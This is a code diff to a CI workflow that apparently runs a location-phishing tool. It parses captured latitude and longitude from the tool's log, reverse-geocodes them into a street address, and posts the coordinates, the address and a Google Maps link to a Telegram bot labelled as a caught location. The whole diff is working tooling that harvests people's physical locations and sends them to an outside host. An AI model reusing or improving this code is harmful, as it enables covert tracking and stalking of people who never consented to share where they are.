@@ -44,10 +44,11 @@ jobs:
             sleep 60
             N=$(grep -c Latitude /tmp/seeker.log 2>/dev/null) || N=0
             if [ "$N" -gt "$ULT" ]; then
-              LAT=$(grep -i Latitude /tmp/seeker.log | tail -1 | grep -oE '[-0-9.]+' | head -1)
-              LON=$(grep -i Longitude /tmp/seeker.log | tail -1 | grep -oE '[-0-9.]+' | head -1)
+              LIMPO=$(sed 's/\x1b\[[0-9;]*m//g' /tmp/seeker.log)
+              LAT=$(echo "$LIMPO" | grep -i Latitude | tail -1 | awk -F': ' '{print $2}' | grep -oE '[-0-9.]+' | head -1)
+              LON=$(echo "$LIMPO" | grep -i Longitude | tail -1 | awk -F': ' '{print $2}' | grep -oE '[-0-9.]+' | head -1)
               END=$(curl -s -m 10 -A "sino-kali" "https://nominatim.openstreetmap.org/reverse?lat=${LAT}&lon=${LON}&format=json" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('display_name','endereco nao achado'))" 2>/dev/null || echo "geocodigo falhou")
-              BLOCO=$(grep -iA6 Latitude /tmp/seeker.log | tail -12)
+              BLOCO=$(echo "$LIMPO" | grep -iA6 Latitude | tail -12)
               MSG2=$(printf "LOCALIZACAO PEGA (#%s):\n%s\n\nENDERECO: %s\nMaps: https://maps.google.com/?q=%s,%s" "$N" "$BLOCO" "$END" "$LAT" "$LON")
               curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSG2}" || true
               ULT=$N
